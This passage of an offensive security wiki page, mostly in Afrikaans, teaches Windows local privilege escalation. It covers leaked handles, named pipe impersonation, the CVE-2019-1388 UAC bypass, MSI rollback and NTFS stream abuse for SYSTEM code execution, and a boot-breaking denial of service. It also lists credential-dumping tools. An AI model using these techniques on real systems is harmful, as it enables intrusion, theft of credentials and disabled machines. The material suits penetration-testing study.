Stel jou voor dat **'n proses wat as SYSTEM loop 'n nuwe proses oopmaak** (`OpenProcess()`) met **full access**. Dieselfde proses **skep ook 'n nuwe proses** (`CreateProcess()`) **met low privileges maar wat al die oop handles van die hoofproses erf**.\
As jy dus **full access tot die low privileged process** het, kan jy die **oop handle na die privileged process geskep** met `OpenProcess()` gryp en **'n shellcode injekteer**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gedeelde geheue-segmente, verwys na as **pipes**, maak proseskommunikasie en data-oordrag moontlik.

Windows bied 'n funksie genaamd **Named Pipes**, wat onverwante prosesse toelaat om data te deel, selfs oor verskillende netwerke. Dit lyk soos 'n client/server-argitektuur, met rolle gedefinieer as **named pipe server** en **named pipe client**.

Wanneer data deur 'n pipe deur 'n **client** gestuur word, het die **server** wat die pipe opgestel het die vermoë om die **identiteit van die client aan te neem**, op voorwaarde dat dit die nodige **SeImpersonate** regte het. Om 'n **privileged process** te identifiseer wat via 'n pipe kommunikeer wat jy kan naboots, gee 'n geleentheid om **hoër voorregte te verkry** deur die identiteit van daardie proses aan te neem sodra dit met die pipe wat jy opgestel het interageer. Vir instruksies oor die uitvoering van so 'n aanval, is nuttige gidse beskikbaar [**here**](named-pipe-client-impersonation.md) en [**here**](#from-high-integrity-to-system).

Verder laat die volgende tool toe om **'n named pipe-kommunikasie te onderskep met 'n tool soos burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie tool laat toe om alle pipes te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Divers

### File Extensions that could execute stuff in Windows

Kyk na die bladsy **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

Wanneer jy 'n shell as 'n gebruiker kry, kan daar geskeduleerde take of ander prosesse wees wat uitgevoer word wat **pass credentials on the command line**. Die script hieronder vang proses command lines elke twee sekondes en vergelyk die huidige toestand met die vorige toestand, en gee enige verskille uit.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Wagwoorde van prosesse steel

## Van Low Priv User na NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

As jy toegang het tot die grafiese koppelvlak (via console of RDP) en UAC is geaktiveer, is dit in sommige weergawes van Microsoft Windows moontlik om 'n terminal of enige ander proses, soos "NT\AUTHORITY SYSTEM", te laat loop vanaf 'n onbevoorregte gebruiker.

Dit maak dit moontlik om privilegies te eskaleer en UAC terselfdertyd met dieselfde kwesbaarheid te omseil. Verder is daar geen behoefte om enigiets te installeer nie, en die binêre wat tydens die proses gebruik word, is geteken en uitgegee deur Microsoft.

Sommige van die aangetaste stelsels is die volgende:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Om hierdie kwesbaarheid uit te buit, is dit nodig om die volgende stappe uit te voer:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Van Administrator Medium na Hoë Integriteitsvlak / UAC Bypass

Lees dit om te **leer oor Integriteitsvlakke**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lees dan **dit om te leer oor UAC en UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Van Willekeurige Map Verwyder/Verplaas/Hernoem na SYSTEM EoP

Die tegniek beskryf [**in hierdie blogpost**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) met 'n exploit-kode [**beskikbaar hier**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Die aanval behels basies die misbruik van die Windows Installer se rollback-funksie om legitieme lêers met kwaadwillige een te vervang tydens die deïnstallasieproses. Hiervoor moet die aanvaller 'n **kwaadaardige MSI installer** skep wat gebruik sal word om die `C:\Config.Msi`-map te kap, wat later deur die Windows Installer gebruik sal word om rollback-lêers te stoor tydens die deïnstallasie van ander MSI-pakkette waartydens die rollback-lêers gemodifiseer sou wees om die kwaadwillige payload te bevat.

Die opgesomde tegniek is soos volg:

1. **Fase 1 – Voorbereiding vir die Kaping (laat `C:\Config.Msi` leeg)**

- Stap 1: Installeer die MSI
- Skep 'n `.msi` wat 'n onskadelike lêer (bv., `dummy.txt`) in 'n skryfbare vouer (`TARGETDIR`) installeer.
- Merk die installer as **"UAC Compliant"**, sodat 'n **nie-admin gebruiker** dit kan uitvoer.
- Hou 'n **handle** oop na die lêer ná installasie.

- Stap 2: Begin Deïnstallasie
- Deïnstalleer dieselfde `.msi`.
- Die deïnstallasieproses begin lêers na `C:\Config.Msi` skuif en hernoem hulle na `.rbf` lêers (rollback-backups).
- **Polleer die oop lêer-handle** met `GetFinalPathNameByHandle` om te ontdek wanneer die lêer `C:\Config.Msi\<random>.rbf` word.

- Stap 3: Pasgemaakte Sinchronisasie
- Die `.msi` bevat 'n **pasgemaakte uninstall-aksie (`SyncOnRbfWritten`)** wat:
- Sein gee wanneer `.rbf` geskryf is.
- Dan **wag** op 'n ander event voordat die deïnstallasie voortgaan.

- Stap 4: Blokkeer Vee van `.rbf`
- Wanneer gesignaleer, **open die `.rbf`-lêer** sonder `FILE_SHARE_DELETE` — dit **keer dat dit verwyder kan word**.
- Dan **seine terug** sodat die deïnstallasie kan klaarmaak.
- Windows Installer kan nie die `.rbf` verwyder nie, en omdat dit nie al die inhoud kan verwyder nie, **word `C:\Config.Msi` nie verwyder nie**.

- Stap 5: Verwyder `.rbf` Handmatig
- Jy (aanvaller) verwyder die `.rbf`-lêer handmatig.
- Nou is **`C:\Config.Msi` leeg**, gereed om gekaap te word.

> Op hierdie punt, **trigger die SYSTEM-level arbitrary folder delete kwetsbaarheid** om `C:\Config.Msi` te verwyder.

2. **Fase 2 – Vervanging van Rollback-skripte met Kwaadwilliges**

- Stap 6: Herstel `C:\Config.Msi` met Swak ACLs
- Herstel self die `C:\Config.Msi`-map.
- Stel **swak DACLs** in (bv., Everyone:F), en **hou 'n handle oop** met `WRITE_DAC`.

- Stap 7: Voer Nog 'n Installasie uit
- Installeer die `.msi` weer, met:
- `TARGETDIR`: Skryfbare ligging.
- `ERROROUT`: 'n veranderlike wat 'n geforseerde fout veroorsaak.
- Hierdie installasie sal gebruik word om weer **rollback** te trigger, wat `.rbs` en `.rbf` lees.

- Stap 8: Monitor vir `.rbs`
- Gebruik `ReadDirectoryChangesW` om `C:\Config.Msi` te monitor totdat 'n nuwe `.rbs` verskyn.
- Kaptureer die lêernaam.

- Stap 9: Sinchroniseer Voor Rollback
- Die `.msi` bevat 'n **pasgemaakte install-aksie (`SyncBeforeRollback`)** wat:
- 'n event sein gee wanneer die `.rbs` geskep is.
- Dan **wag** voordat dit voortgaan.

- Stap 10: Herapplikasie van Swak ACL
- Nadat jy die `'.rbs created'` event ontvang het:
- Die Windows Installer **herappliseer sterk ACLs** op `C:\Config.Msi`.
- Maar aangesien jy steeds 'n handle met `WRITE_DAC` het, kan jy weer **swak ACLs herappliseer**.

> ACLs word **slegs afdwing op handle open**, so jy kan steeds na die vouer skryf.

- Stap 11: Plaas Fake `.rbs` en `.rbf`
- Oorskryf die `.rbs`-lêer met 'n **fake rollback-skrip** wat Windows vertel om:
- Jou `.rbf` (kwaadaardige DLL) in 'n **geprivilegieerde ligging** te herstel (bv., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Jou fake `.rbf` neer te sit wat 'n **kwaadaardige SYSTEM-level payload DLL** bevat.

- Stap 12: Trigger die Rollback
- Sein die sinchronisasie-event sodat die installer hervat.
- 'n **type 19 custom action (`ErrorOut`)** is gekonfigureer om die install doelbewus op 'n bekende punt te laat misluk.
- Dit veroorsaak dat **rollback begin**.

- Stap 13: SYSTEM Installeer Jou DLL
- Windows Installer:
- Lees jou kwaadwillige `.rbs`.
- Kopieer jou `.rbf` DLL na die teikengebied.
- Jy het nou jou **kwaadaardige DLL in 'n SYSTEM-gelaaide pad**.

- Finale Stap: Voer SYSTEM-kode uit
- Voer 'n vertroude **auto-elevated binary** uit (bv., `osk.exe`) wat die DLL wat jy gekaap het laai.
- **Boom**: Jou kode word uitgevoer **as SYSTEM**.

### Van Arbitrary File Delete/Move/Rename na SYSTEM EoP

Die hoof MSI-rollback-tegniek (die vorige een) aanvaar dat jy 'n **gehele map** kan verwyder (bv., `C:\Config.Msi`). Maar wat as jou kwetsbaarheid slegs **arbitrary file deletion** toelaat?

Jy kan **NTFS internals** uitbuit: elke map het 'n verborge alternate data stream genoem:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Hierdie stroom stoor die **indeksmetagegewens** van die vouer.

Dus, as jy **die `::$INDEX_ALLOCATION`-stroom verwyder** van 'n vouer, sal NTFS die **gehele vouer** uit die lêerstelsel verwyder.

Jy kan dit doen met standaard lêerverwyderings-APIs soos:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Alhoewel jy 'n *file* delete API aanroep, verwyder dit **die vouer self**.

### Van Folder Contents Delete na SYSTEM EoP
Wat as jou primitief jou nie toelaat om arbitrêre files/folders te verwyder nie, maar dit **laat wel verwydering van die *contents* van 'n attacker-controlled folder toe**?

1. Stap 1: Stel 'n bait folder en file op
- Skep: `C:\temp\folder1`
- Daarin: `C:\temp\folder1\file1.txt`

2. Stap 2: Plaas 'n **oplock** op `file1.txt`
- Die oplock **pauzeer die uitvoering** wanneer 'n geprivilegieerde proses probeer om `file1.txt` te verwyder.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Stap 3: Activeer SYSTEM-proses (bv., `SilentCleanup`)
- Hierdie proses skandeer gidse (bv., `%TEMP%`) en probeer hul inhoud verwyder.
- Wanneer dit `file1.txt` bereik, die **oplock triggers** en oorhandig beheer aan jou callback.

4. Stap 4: Binne die oplock callback – herlei die verwydering

- Opsie A: Verskuif `file1.txt` na elders
- Dit maak `folder1` leeg sonder om die oplock te breek.
- Moet nie `file1.txt` direk verwyder nie — dit sal die oplock voortydig vrylaat.

- Opsie B: Skakel `folder1` om in 'n **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opsie C: Skep ' **symlink** ' in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dit mik op die NTFS interne stroom wat gids-metagegewens stoor — deur dit te verwyder, verwyder dit die gids.

5. Stap 5: Vrylaat die oplock
- SYSTEM-proses gaan voort en probeer `file1.txt` verwyder.
- Maar nou, as gevolg van die junction + symlink, verwydel dit eintlik:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultaat**: `C:\Config.Msi` word deur SYSTEM verwyder.

### Van Arbitrary Folder Create na Permanent DoS

Benut 'n primitive wat jou toelaat om **create an arbitrary folder as SYSTEM/admin** — selfs al **you can’t write files** of **set weak permissions**.

Skep 'n **folder** (nie 'n **file** nie) met die naam van 'n **critical Windows driver**, e.g.:
```
C:\Windows\System32\cng.sys
```
- Hierdie pad kom gewoonlik ooreen met die `cng.sys` kernel-modus driver.
- As jy dit **vooraf as 'n vouer skep**, kan Windows nie die werklike bestuurder tydens opstart laai nie.
- Dan probeer Windows tydens opstart die `cng.sys` laai.
- Dit sien die vouer, **kan nie die werklike bestuurder vind nie**, en **crash of staak die opstart**.
- Daar is **geen terugvalopsie**, en **geen herstel** sonder eksterne ingryping (bv. opstartherstel of skyftoegang).


## **Van High Integrity na SYSTEM**

### **Nuwe diens**

As jy reeds op 'n High Integrity-proses loop, kan die **pad na SYSTEM** eenvoudig wees deur net 'n **nuwe diens te skep en uit te voer**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wanneer jy 'n service binary skep, maak seker dit is 'n geldige service of dat die binary die nodige aksies vinnig uitvoer, aangesien dit binne 20s gedood sal word as dit nie 'n geldige service is nie.

### AlwaysInstallElevated

Vanuit 'n High Integrity-proses kan jy probeer om **enable the AlwaysInstallElevated registry entries** te doen en 'n reverse shell te **install** met 'n _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

As jy daardie token privileges het (waarskynlik vind jy dit reeds in 'n High Integrity-proses), sal jy in staat wees om **open almost any process** (not protected processes) met die SeDebug privilege, die token van die proses te **copy the token**, en 'n **arbitrary process with that token** te create.\
Hierdie tegniek kies gewoonlik 'n proses wat as SYSTEM loop en al die token privileges het (**yes, you can find SYSTEM processes without all the token privileges**).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Hierdie tegniek word deur meterpreter gebruik om te escalate in `getsystem`. Die tegniek bestaan uit **creating a pipe and then create/abuse a service to write on that pipe**. Daarna sal die **server** wat die pipe geskep het met die **`SeImpersonate`** privilege in staat wees om die token van die pipe kliënt (die service) te **impersonate the token** en SYSTEM privileges te bekom.\
As jy [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
As jy 'n voorbeeld wil lees van [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

As jy daarin slaag om **hijack a dll** wat deur 'n **process** wat as **SYSTEM** loop **loaded** word, sal jy in staat wees om arbitrêre kode uit te voer met daardie permissies. Daarom is Dll Hijacking ook nuttig vir hierdie tipe privilege escalation, en boontoe is dit veel **more easy to achieve from a high integrity process** aangesien dit **write permissions** op die gidse sal hê wat gebruik word om dlls te laai.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Beste hulpmiddel om Windows local privilege escalation vectors te soek:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kontroleer vir miskonfigurasies en sensitiewe lêers (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Gedetecteer.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kontroleer moontlike miskonfigurasies en versamel inligting (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kontroleer vir miskonfigurasies**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Dit onttrek PuTTY, WinSCP, SuperPuTTY, FileZilla, en RDP gestoor sessie-inligting. Gebruik -Thorough plaaslik.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Onttrek kredensiale vanaf Credential Manager. Gedetecteer.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray versamelde wagwoorde oor die domein**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is 'n PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer en man-in-the-middle hulpmiddel.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese privesc Windows-ondersoek**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Soek na bekende privesc-kwetsbaarhede (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale kontrole **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek bekende privesc kwetsbaarhede (moet saamgestel word met VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Lys die gasheer af en soek vir miskonfigurasies (meer 'n inligtingsversamelingshulpmiddel as privesc) (moet saamgestel word) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Onttrek kredensiale vanaf baie sagteware (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port van PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Kontroleer vir miskonfigurasies (uitvoerbare lêer voor-opgestel in github). Nie aanbeveel nie. Werk nie goed in Win10 nie.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kontroleer vir moontlike miskonfigurasies (exe van python). Nie aanbeveel nie. Werk nie goed in Win10 nie.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Hulpmiddel geskep gebaseer op hierdie pos (dit benodig nie accesschk om behoorlik te werk nie, maar dit kan dit gebruik).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (lokale python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (lokale python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Jy moet die projek saamstel met die korrekte weergawe van .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde weergawe van .NET op die slagoffer se gasheer te sien kan jy doen:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Verwysings

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
